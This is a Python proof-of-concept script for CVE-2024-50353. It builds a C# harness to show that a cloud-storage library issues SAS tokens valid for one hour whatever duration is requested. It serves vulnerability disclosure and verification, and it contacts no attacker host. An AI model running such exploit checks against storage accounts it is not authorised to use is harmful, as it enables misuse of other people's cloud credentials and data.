#!/usr/bin/env python3
"""
PoC for CVE-2024-50353 - ICG.AspNetCore.Utilities.CloudStorage 6.0.0

Usage:
    python exploit.py "<connection-string>" <container> <blobName> <minutes>

Arguments
---------
connection-string : A storage connection string that *contains an AccountKey*.
container         : Name of the blob container.
blobName          : Name of an existing blob.
minutes           : The token duration that the caller WANTS (e.g. 1).

The script shows that irrespective of the requested <minutes>, the SAS URL
returned by the vulnerable library is always valid for **exactly one hour**.
"""

import sys
import datetime
import subprocess
import tempfile
import pathlib

if len(sys.argv) != 5:
    print('Usage: python exploit.py "<connection-string>" <container> <blobName> <minutes>')
    sys.exit(1)

conn, container, blob, mins = sys.argv[1:]
mins = int(mins)

work = tempfile.mkdtemp(prefix="cve_50353_")
proj = pathlib.Path(work, "poc.csproj")
prog = pathlib.Path(work, "Program.cs")

# Find the DLL path
dll_path = pathlib.Path(__file__).resolve().parent.parent / "src" / "AspNetCore.Utilities.CloudStorage" / "bin" / "Release" / "net6.0" / "AspNetCore.Utilities.CloudStorage.dll"

# Escape connection string for C# - use string concatenation to avoid f-string backslash issues
escaped_conn = conn.replace('"', '\\"')

proj_content = '''<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net6.0</TargetFramework>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="CloudStorage">
      <HintPath>''' + str(dll_path) + '''</HintPath>
    </Reference>
    <PackageReference Include="Azure.Storage.Blobs" Version="12.10.0" />
    <PackageReference Include="ICG.NetCore.Utilities" Version="6.0.0" />
    <PackageReference Include="Microsoft.Extensions.Logging.Abstractions" Version="6.0.0" />
  </ItemGroup>
</Project>'''
proj.write_text(proj_content)

# Build Program.cs using string concatenation (no f-strings with backslashes)
cs_code = '''using System;
using ICG.AspNetCore.Utilities.CloudStorage;
using Microsoft.Extensions.Logging.Abstractions;
using Microsoft.Extensions.Options;
using ICG.NetCore.Utilities;

class X
{
    static void Main()
    {
        var opt = Options.Create(new AzureCloudStorageOptions
        {
            StorageConnectionString = "''' + escaped_conn + '''",
            RootClientPath = "https://example.blob.core.windows.net",
            DefaultSASTokenDurationMinutes = 5
        });
        var slugger = new UrlSlugGenerator();
        var mime = new MimeTypeMapper();
        var prov = new AzureCloudStorageProvider(opt, slugger, mime, NullLogger<AzureCloudStorageProvider>.Instance);
        
        var sasUrl = prov.CreateSASUrl("''' + container + '''", "''' + blob + '''", ''' + str(mins) + ''');
        
        var uri = new Uri(sasUrl);
        var q = System.Web.HttpUtility.ParseQueryString(uri.Query);
        Console.WriteLine(q["se"]);
    }
}'''
prog.write_text(cs_code)

# Build & run
print(f"Building project in {work}...")
result = subprocess.run(["dotnet", "build", str(proj)], capture_output=True, text=True)
if result.returncode != 0:
    print(f"Build failed: {result.stderr}")
    sys.exit(1)

print("Running exploit...")
p = subprocess.run(["dotnet", "run", "--project", str(proj)], capture_output=True, text=True)
actual_se_string = p.stdout.strip()

try:
    actual_expiry = datetime.datetime.fromisoformat(actual_se_string.rstrip('Z'))
    expected_expiry = datetime.datetime.utcnow() + datetime.timedelta(minutes=mins)
    
    print(f"Requested duration : {mins} minutes")
    print(f"Actual expiry UTC  : {actual_expiry}")
    print(f"Expected expiry    : {expected_expiry}")
    
    delta = actual_expiry - datetime.datetime.utcnow()
    actual_minutes = delta.total_seconds() / 60
    print(f"Token returned is valid for ~ {actual_minutes:.1f} minutes")
    
    # The vulnerability is that token lasts 1 hour (60 min) regardless of requested duration
    if abs(actual_minutes - 60) < 2:
        print("\n[+] Vulnerability successfully exploited - token lasts 1 hour regardless of requested duration.")
    else:
        print("\n[-] Library appears to be patched.")
except Exception as e:
    print(f"Error parsing expiry: {e}")
    print(f"Raw output: {p.stdout}")
    print(f"Stderr: {p.stderr}")
